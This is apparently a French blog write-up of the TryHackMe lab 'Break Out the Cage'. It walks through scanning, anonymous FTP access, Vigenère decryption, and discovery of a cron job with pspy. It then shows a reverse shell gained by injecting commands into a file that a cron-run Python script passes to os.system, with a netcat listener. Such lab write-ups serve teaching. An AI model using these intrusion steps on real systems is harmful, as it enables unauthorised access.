---
title: "Write-up | Break Out the Cage"
date: 2020-07-08T18:02:12+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

C'est parti pour la room Break Out The Cage sur [Try Hack Me](https://tryhackme.com).

Synopsis :
> Help Cage bring back his acting career and investigate the nefarious goings on of his agent!

## Reconnaissance

Premier scan des ports avec le script vuln :
```
$ nmap -sV -sC --script vuln 10.10.80.82 -oN scans/ports.txt
...
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_sslv2-drown: 
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /html/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
|_  /scripts/: Potentially interesting directory w/ listing on 'apache/2.4.29 (ubuntu)'
| http-internal-ip-disclosure: 
|_  Internal IP Leaked: 127.0.1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.29: 
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Les services intéressants ici sont ssh, ftp, le server Apache (qui d'ailleurs a de nombreuses vulnérabilités.).

J'énumère ensuite le site avec `gobuster` :
```
$ gobuster dir -u 10.10.80.82 -w /usr/share/wordlists/dirb/big.txt -o scans/dirs.txt
...
===============================================================
2020/07/08 13:54:12 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/contracts (Status: 301)
/html (Status: 301)
/images (Status: 301)
/scripts (Status: 301)
/server-status (Status: 403)
===============================================================
2020/07/08 13:56:08 Finished
===============================================================
```
Les dossiers qui attirent mon attention ici sont `/contracts` et `/scripts`.

`/contracts` ne contient qu'un seul fichier qui est vide, alors que `/scripts` en contient 5. À première vue, on pourrait penser que ce sont des scripts au sens informatique du terme mais non : ce sont des scripts de pièce de théâtre ou de films ! Ils ne semblent pas contenir de commentaire HTML, il va donc falloir les lire afin de voir si ils peuvent être utiles.

En réalité, ces textes sont tous les mêmes : seuls les noms, les lieux etc... changent.

Je suis dubitatif quant à l'utilité de ces scripts.

Par curiosité, j'essaie de me connecter en FTP avec les identifiants (user: anonymous et pas de mot de passe) par défaut, et ça marche !
```
$ ftp 10.10.80.82
Connected to 10.10.80.82.
220 (vsFTPd 3.0.3)
Name (10.10.80.82:ezekiel): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```
Il y a un fichier `dad_tasks` que je récupère :
```
ftp> lcd /home/ezekiel/Documents/tryhackme/break_out_the_cage/
Local directory now /home/ezekiel/Documents/tryhackme/break_out_the_cage
ftp> get dad_tasks
local: dad_tasks remote: dad_tasks
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dad_tasks (396 bytes).
226 Transfer complete.
396 bytes received in 0.05 secs (7.2582 kB/s)
```

C'est une chaine de caractères encodée. J'essaie du base64 :
```
$ cat dad_tasks | base64 -d
Qapw Eekcl - Pvr RMKP...XZW VWUR... TTI XEF... LAA ZRGQRO!!!!
Sfw. Kajnmb xsi owuowge
Faz. Tml fkfr qgseik ag oqeibx
Eljwx. Xil bqi aiklbywqe
Rsfv. Zwel vvm imel sumebt lqwdsfk
Yejr. Tqenl Vsw svnt "urqsjetpwbn einyjamu" wf.

Iz glww A ykftef.... Qjhsvbouuoexcmvwkwwatfllxughhbbcmydizwlkbsidiuscwl
```
Étant donné que c'est une liste, j'imagine que 'Sfw.' correspond à 'One.', 'Faz.' à 'Two.' etc...

Ce n'est pas du code César, et mes tentatives de ROT13 ne portent pas leurs fruits. C'est peut-être du Vigenère mais je n'ai pas de clé à utiliser

Étant bloqué, je retente une énumération avec un dictionnaire plus gros, histoire de voir si j'ai loupé quelque chose. Et c'est le cas. Ce n'est pas le première fois que je me fais avoir, j'essaie de gagner du temps en utilisant des petits dictionnaires mais en réalité ça m'en fait plus perdre qu'autre chose :)$

Je découvre donc un directory `/auditions` avec un fichier audio `must_practice_corrupt_file.mp3` que je récupère.
```
$ wget http://10.10.80.82/auditions/must_practice_corrupt_file.mp3
--2020-07-08 14:42:56--  http://10.10.80.82/auditions/must_practice_corrupt_file.mp3
Connexion à 10.10.80.82:80… connecté.
requête HTTP transmise, en attente de la réponse… 200 OK
Taille : 1109983 (1,1M) [audio/mpeg]
Sauvegarde en : « must_practice_corrupt_file.mp3 »

must_practice_corrupt_file.mp3        100%[========================================================================>]   1,06M   109KB/s    ds 39s     

2020-07-08 14:43:34 (28,1 KB/s) — « must_practice_corrupt_file.mp3 » sauvegardé [1109983/1109983]
```
Je l'ouvre avec Audacity pour écouter. Il y a toute une partie de la piste audio qui est complètement abimée. Je regarde l'analyse spectrale grâce à [l'outil d'analyse spectrale de dCode](https://www.dcode.fr/analyse-spectrale) (ils sont trop forts), et un mot apparait !
C'est la clé de Vigenère !
On trouve alors le contenu original du fichier `dad_tasks` :
```
Dads Tasks - The RAGE...THE CAGE... THE MAN... THE LEGEND!!!!
One. Revamp the website
Two. Put more quotes in script
Three. Buy bee pesticide
Four. Help him with acting lessons
Five. Teach Dad what "information security" is.

In case I forget.... [edited]
```
C'est le mot de passe SSH de Weston qui est donné ici.

## Exploitation

Il n'y a rien dans son home dir.
```
$ sudo -l
[sudo] password for weston: 
Matching Defaults entries for weston on national-treasure:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User weston may run the following commands on national-treasure:
    (root) /usr/bin/bees
```
Le seul fichier exécutable en root est `/usr/bin/bees`.
```
$ sudo bees 
                                                                               
Broadcast message from weston@national-treasure (pts/0) (Wed Jul  8 14:55:33 20
                                                                               
AHHHHHHH THEEEEE BEEEEESSSS!!!!!!!!
```
Pas très utile pour l'instant.
De temps en temps (on dirait toutes les 3 minutes), des messages sont envoyés sur le terminal :
```
Broadcast message from cage@national-treasure (somewhere) (Wed Jul  8 14:57:01 
                                                                               
You'll be seeing a lot of changes around here. Papa's got a brand new bag. — Face/Off

Broadcast message from cage@national-treasure (somewhere) (Wed Jul  8 15:00:01 
                                                                               
What's in the bag? A shark or something? — The Wicker Man
```
Il y a fort à parier que ce soit un cron job qui envoie ces messages.

Sur [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md), il y a une section sur les cron jobs. Ne pouvant pas voir les cron jobs avec l'user Weston, je récupère `pspy64` sur ma machine et l'envoie sur la box :
```
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
...
Sauvegarde en : « pspy64 »

pspy64        100%   2,94M   349KB/s    ds 8,3s        

2020-07-08 15:03:16 (361 KB/s) — « pspy64 » sauvegardé [3078592/3078592]

$ scp pspy64 weston@10.10.80.82:/home/weston
weston@10.10.80.82's password: 
pspy64                                     100% 3006KB 232.2KB/s   00:12
```
Il n'y a plus qu'à le lancer et attendre que l'évènement se produise !
```
2020/07/08 15:12:01 CMD: UID=1000 PID=1918   | /bin/sh -c /opt/.dads_scripts/spread_the_quotes.py 
2020/07/08 15:12:01 CMD: UID=0    PID=1917   | /usr/sbin/CRON -f 
```
On voit donc que c'est un script python qui est exécuté :
```python
#!/usr/bin/env python
  
#Copyright Weston 2k20 (Dad couldnt write this with all the time in the world!)
import os
import random

lines = open("/opt/.dads_scripts/.files/.quotes").read().splitlines()
quote = random.choice(lines)
os.system("wall " + quote)
```
Le script est lancé par le cron job en tant qu'user 'cage'. Il va lire le fichier `.quotes`. Si je peux l'éditer, je pourrais y insérer un reverse shell pour ouvrir une conexion. Je supprime donc tout le contenu et y mets le revshell de [PentestMonkeys](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
Une fois fait, j'écoute sur ma machine : `nc -nlvp 4444`.
Abracadabra :
```
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.8.37.193] from (UNKNOWN) [10.10.80.82] 37106
/bin/sh: 0: can't access tty; job control turned off
$ whoami
cage
```

## Élévation de privilèges

Dans le home dir de cage, il y a un folder `email_backup` avec 3 fichiers dedans :
```
$ cat email_*
From - SeanArcher@BigManAgents.com
To - Cage@nationaltreasure.com

Hey Cage!

There's rumours of a Face/Off sequel, Face/Off 2 - Face On. It's supposedly only in the
planning stages at the moment. I've put a good word in for you, if you're lucky we 
might be able to get you a part of an angry shop keeping or something? Would you be up
for that, the money would be good and it'd look good on your acting CV.

Regards

Sean Archer
From - Cage@nationaltreasure.com
To - SeanArcher@BigManAgents.com

Dear Sean

We've had this discussion before Sean, I want bigger roles, I'm meant for greater things.
Why aren't you finding roles like Batman, The Little Mermaid(I'd make a great Sebastian!),
the new Home Alone film and why oh why Sean, tell me why Sean. Why did I not get a role in the
new fan made Star Wars films?! There was 3 of them! 3 Sean! I mean yes they were terrible films.
I could of made them great... great Sean.... I think you're missing my true potential.

On a much lighter note thank you for helping me set up my home server, Weston helped too, but
not overally greatly. I gave him some smaller jobs. Whats your username on here? Root?

Yours

Cage
From - Cage@nationaltreasure.com
To - Weston@nationaltreasure.com

Hey Son

Buddy, Sean left a note on his desk with some really strange writing on it. I quickly wrote
down what it said. Could you look into it please? I think it could be something to do with his
account on here. I want to know what he's hiding from me... I might need a new agent. Pretty
sure he's out to get me. The note said:

haiinspsyanileph

The guy also seems obsessed with my face lately. He came him wearing a mask of my face...
was rather odd. Imagine wearing his ugly face.... I wouldnt be able to FACE that!! 
hahahahahahahahahahahahahahahaahah get it Weston! FACE THAT!!!! hahahahahahahhaha
ahahahhahaha. Ahhh Face it... he's just odd. 

Regards

The Legend - Cage
```
Il y a donc un mot de passe ou quelque chose à déchiffrer dans ces emails.
Avant d'explorer cette piste, je regarde le contenu du second fichier :
```
$ cat Super_Duper_Checklist
1 - Increase acting lesson budget by at least 30%
2 - Get Weston to stop wearing eye-liner
3 - Get a new pet octopus
4 - Try and keep current wife
5 - Figure out why Weston has this etched into his desk: THM{[edited]}
```
On a enfin le premier flag !

J'avoue que je suis resté coincé à ce moment là. Je n'ai pas trouvé de moyen de décoder `haiinspsyanileph`. Je suis donc allé lire le write-up de [n0sec](https://n0sec.tech/break-out-the-cage/). Voilà la solution :

> That text again looks like ciphertext. Throw it in Cyber Chef again with a Vignere Decode. Reading the rest of the email, we see the word "face" used a lot. After several attempts at a key, we finally get "FACE" as the key.

On trouve donc le mot de passe root, qui permet de lire le dernier flag dans le repertoire `/root/email_backup`.
